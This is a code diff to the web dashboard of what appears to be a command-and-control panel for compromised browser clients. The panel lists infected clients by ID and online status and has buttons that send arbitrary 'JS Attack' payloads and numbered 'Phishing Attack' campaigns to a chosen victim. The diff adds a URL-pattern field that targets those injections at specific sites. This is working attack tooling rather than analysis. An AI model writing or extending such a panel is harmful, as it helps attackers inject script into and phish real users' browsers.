@@ -14,7 +14,8 @@
             $("#inputToSearch").on("keyup", function(){
                 var value = $(this).val().toLowerCase();
                 $("#userlist tr").filter(function(){
-                    $(this).toggle($(this).text().toLowerCase().indexOf(value)>-1)
+                    $(this).toggle($(this).find('#clientid').text().toLowerCase().indexOf(value)>-1)
+
                 });
             });
         });
@@ -45,6 +46,7 @@
             <tr>
                 <th class="text-center">ID</th>
                 <th class="text-center">Status</th>
+                <th class="text-center">URL/Pattern</th>
                 <th class="text-center">JS Attack</th>
                 <th class="text-center">Phishing Attack</th>
                 <th class="text-center"></th>
@@ -68,6 +70,8 @@
                         </td>
                     {% endif %}
 
+                    <td><input id="pattern{{ item[0] }}" type="text" class="form-control"
+                                   aria-label="Text input with segmented dropdown button"></td>
                     <td class="text-center">
                         <form class="input-group">
                             <input id={{ item[0] }} type="text" class="form-control"
@@ -116,7 +120,7 @@
 
         socket.on('disconnectSuccessful', function (id) {
             var fullid = "status" + id.id;
-            element = document.getElementById(fullid);
+            var element = document.getElementById(fullid);
             element.style.backgroundColor = "red";
             element.innerHTML = "Offline";
         });
@@ -128,7 +132,7 @@
 	});
         socket.on('connectSuccessful', function (id) {
             var fullid = "status" + id.id;
-            element = document.getElementById(fullid);
+            var element = document.getElementById(fullid);
             element.style.backgroundColor = "green";
             element.innerHTML = "Online"
         });
@@ -137,6 +141,7 @@
             get_info_display_same_page(id.id);
         });
 
+
         socket.on('newClientInstall', function (id, online) {
 	    console.log(id)
             var $t = $("#userlist");
@@ -144,18 +149,16 @@
             var $trLast = $tbody.find("tr:last").prev('tr');
             var $trLastCollapse = $tbody.find("tr:last");
             var $trNew = $trLast.clone();
-            var $trNewCollapse = $trLastCollapse.clone()
+            var $trNewCollapse = $trLastCollapse.clone();
 
             var $pattern = RegExp($trLast.find('td:first').text().trim(),"g");
             $trNew.html($trNew.html().replace($pattern, id));
             $trNewCollapse.html($trNewCollapse.html().replace($pattern, id));
 
-            if(online = 'True'){
-                var status =  $trNew.find("td:first").next('td');
-                status.css('background-color', 'green');
-                status.text('Online');
-                console.log(status)
-            }
+            var status =  $trNew.find("td:first").next('td');
+            status.css('background-color', 'green');
+            status.text('Online');
+
             $t.append($trNew);
             $t.append($trNewCollapse);
         });
@@ -172,12 +175,14 @@
     function call_javascript(person) {
         document.getElementById("success-message").innerHTML = "JS Attack on " + person + " sent!";
         $('.success').fadeIn().delay(2000).fadeOut();
+
         $.ajax({
             url: "/sendjs",
             type: "post",
             data: {
                 id: person,
-                js: document.getElementById(person).value
+                js: document.getElementById(person).value,
+                pattern: document.getElementById("pattern" + person).value
             },
             success: function (response) {
                 console.log(response);
@@ -186,25 +191,29 @@
                 console.log(error)
             }
         });
+          document.getElementById("pattern" + person).value = "";
     }
 
     function call_phishing(id, attackNumber) {
         document.getElementById("success-message").innerHTML = "Phishing Attack #" + attackNumber + " on " + id + " sent!";
+
         $('.success').fadeIn().delay(500).fadeOut();
         $.ajax({
             url: "/phish",
             type: "post",
             data: {
                 id: id,
-                number: attackNumber
+                number: attackNumber,
+                pattern: document.getElementById("pattern" + id).value
             },
             success: function (response) {
-                console.log('Success');
+                console.log(response);
             },
             error: function (error) {
                 console.log(error)
             }
         });
+        document.getElementById("pattern" + id).value = "";
 
 
     }
